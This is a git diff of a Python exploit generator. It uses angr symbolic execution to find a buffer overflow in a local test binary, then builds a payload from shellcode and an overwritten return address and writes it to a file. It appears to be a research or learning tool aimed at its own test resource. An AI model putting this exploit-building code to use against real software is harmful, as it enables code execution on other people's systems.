@@ -59,11 +59,11 @@ def scan_target(file_path, target_addr):
             raise Exception("No address found for function : "+func_name)
     argv = [project.filename]
 
-    sym_arg_size = 750
+    sym_arg_size = 550
 
     sym_arg = claripy.BVS('sym_arg', 8 * sym_arg_size)
     argv.append(sym_arg)
-    argv.append("Found the canary")
+    argv.append("Found-the-canary")
 
     state = project.factory.entry_state(args=argv)
 
@@ -153,19 +153,19 @@ def append_shellcode(payload_bytearray):
     print("Length of shellcode: " + str(len(shellcode)) + " at index: " + str(index))
     return index
 
-    
+
 def inject_ret_addr(payload_bytearray, distance_to_BP, target_addr):
     """
     Takes in payload string with shellcode and distance to the stack base pointer
-    from the buffer. 
+    from the buffer.
     """
     print("Distance to base pointer from buffer is: " + str(distance_to_BP))
-    distance_to_BP = 536
-    distance_to_BP += 8 #RBP + 8 is Ret address
-    encoded_addr = (target_addr[0]).to_bytes(8, byteorder='little')
-    final_payload = payload_bytearray[:distance_to_BP]
-    final_payload += encoded_addr
-    final_payload += payload_bytearray[distance_to_BP:]
+    print(f"Injecting return address: {target_addr}")
+    #distance_to_BP += 8 #RBP + 8 is Ret address
+    encoded_addr = struct.pack("<Q",target_addr[0])
+    final_payload = payload_bytearray[:distance_to_BP] + encoded_addr +\
+    encoded_addr + encoded_addr + payload_bytearray[distance_to_BP:]
+    print(f'{final_payload}')
     return final_payload
 
 import codecs
@@ -182,23 +182,27 @@ def convert_to_string(bytearr):
     return bytearr.decode('utf-8', 'slashescape')
 
 
+def test_payload(payload, file_path):
+    if not os.path.isfile(file_path):
+        subprocess.call("make clean", cwd=os.path.dirname(file_path), shell=True)
+    subprocess.call("make", cwd=os.path.dirname(file_path), shell=True)
+    subprocess.call(["."+os.path.abspath(file_path),bytes(payload),"Found the canary"],shell=False)
+    print("Finished running test.")
+
 def generate_exploit():
     target_addr = [0x0]
     angr_payload = scan_target("../tests/resources/simple_buffer.o", target_addr)
     payload_bytearray = clean_nulls(angr_payload[0])
     append_shellcode(payload_bytearray)
     final_payload = inject_ret_addr(payload_bytearray, angr_payload[1], target_addr)
-    print(f'Final payload {final_payload}')
-    return convert_to_string(final_payload)
+    return final_payload
 
-def test_payload(payload, file_path):
-    if not os.path.isfile(file_path):
-        subprocess.call("make clean", cwd=os.path.dirname(file_path), shell=True)
-    subprocess.call("make", cwd=os.path.dirname(file_path), shell=True)
-    subprocess.call("./" + file_path + " \"" + payload + "\" \"Found the canary\"", shell=True, cwd=".")
-    print("Finished running test.")
 
 
 if __name__ == "__main__":
     payload = generate_exploit()
-    test_payload(payload, "../tests/resources/simple_buffer.o")
+    print(f'{payload}')
+    payload_file = open("../tests/resources/payload_file.txt", "wb")
+    payload_file.write(payload)
+    payload_file.close()
+
